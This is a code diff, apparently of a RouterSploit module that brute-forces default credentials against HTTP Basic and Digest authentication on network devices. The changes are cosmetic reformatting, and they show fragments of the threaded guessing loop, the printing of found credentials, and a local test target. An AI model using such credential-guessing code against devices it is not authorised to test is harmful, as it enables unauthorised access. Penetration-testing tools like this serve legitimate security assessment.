@@ -13,7 +13,8 @@ class Exploit(HTTPClient):
                        "If valid credentials are found, they are displayed to the user.",
         "authors": (
             "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
-            "Alexander Yakovlev <https://github.com/toxydose>",  # upgrading to perform bruteforce attack against HTTP Digest Auth service
+            "Alexander Yakovlev <https://github.com/toxydose>",
+        # upgrading to perform bruteforce attack against HTTP Digest Auth service
         ),
         "devices": (
             "Multiple devices",
@@ -43,7 +44,7 @@ class Exploit(HTTPClient):
         if not self.check():
             return
 
-        print_status("Starting default creds attack against {}".format(self.path))
+        print_status(f"Starting default creds attack against {self.path}")
 
         data = LockedIterator(self.defaults)
         self.run_threads(self.threads, self.target_function, data)
@@ -75,11 +76,17 @@ class Exploit(HTTPClient):
                     if self.stop_on_success:
                         running.clear()
 
-                    print_success("Authentication Succeed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)
+                    print_success(
+                        f"Authentication Succeed - Username: '{username}' Password: '{password}'",
+                        verbose=self.verbosity,
+                    )
                     self.credentials.append((self.target, self.port, self.target_protocol, username, password))
 
                 else:
-                    print_error("Authentication Failed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)
+                    print_error(
+                        f"Authentication Failed - Username: '{username}' Password: '{password}'",
+                        verbose=self.verbosity,
+                    )
 
             except StopIteration:
                 break
@@ -102,7 +109,8 @@ class Exploit(HTTPClient):
             self.auth_type = "basic"
             return True
         elif "Digest" in response.headers["WWW-Authenticate"]:
-            print_status("Target exposes resource {} protected by Digest Auth".format(self.path), verbose=self.verbosity)
+            print_status("Target exposes resource {} protected by Digest Auth".format(self.path),
+                         verbose=self.verbosity)
             self.auth_type = "digest"
             return True
 
@@ -123,7 +131,6 @@ class Exploit(HTTPClient):
 
 
 if "__main__" == __name__:
-
     exploit = Exploit()
     exploit.target = "192.168.0.137"
     print(exploit.check())
